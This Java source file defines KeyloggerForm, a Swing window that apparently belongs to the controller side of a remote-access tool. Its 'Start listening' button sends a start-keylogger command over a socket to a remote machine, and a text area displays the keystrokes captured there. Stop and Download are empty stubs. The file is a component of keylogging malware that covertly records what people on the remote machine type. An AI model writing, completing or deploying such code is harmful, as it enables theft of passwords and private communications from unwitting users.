package Client.View;

import java.awt.EventQueue;
import java.net.Socket;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import General.Commands;

import javax.swing.JTextArea;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.io.DataOutputStream;
import java.io.IOException;
import java.awt.event.ActionEvent;

public class KeyloggerForm extends JFrame {

	private static final long serialVersionUID = 1L;
	private JPanel contentPane;
	private Socket socket = null;
	private DataOutputStream dataOutputStream = null;
	private JTextArea textAreaKeylogger;

	/**
	 * Create the frame.
	 * @throws IOException 
	 */
	public KeyloggerForm(Socket socket) throws IOException {
		this.setSocket(socket);
		dataOutputStream = new DataOutputStream(socket.getOutputStream());
		
		setResizable(false);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));

		setContentPane(contentPane);
		contentPane.setLayout(null);
		
		textAreaKeylogger = new JTextArea();
		textAreaKeylogger.setEditable(false);
		textAreaKeylogger.setLineWrap(true);
		textAreaKeylogger.setBounds(10, 11, 414, 178);
		contentPane.add(textAreaKeylogger);
		
		JButton btnStart = new JButton("Start listening");
		btnStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				try {
					System.out.println("Request start listening ...");
					dataOutputStream.writeInt(Commands.REQUEST_START_KEYLOGGER.getAbbrev());
					dataOutputStream.flush();
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
			}
		});
		btnStart.setBounds(10, 200, 118, 23);
		contentPane.add(btnStart);
		
		JButton btnStop = new JButton("Stop");
		btnStop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				
			}
		});
		btnStop.setBounds(10, 227, 118, 23);
		contentPane.add(btnStop);
		
		JButton btnDownload = new JButton("Download");
		btnDownload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				
			}
		});
		btnDownload.setBounds(335, 212, 89, 38);
		contentPane.add(btnDownload);
	}

	public Socket getSocket() {
		return socket;
	}

	public void setSocket(Socket socket) {
		this.socket = socket;
	}
	
	public void listening(String keyChar) {
		System.out.println("listening key press: " + keyChar);
		textAreaKeylogger.append(keyChar + " ");
	}
}
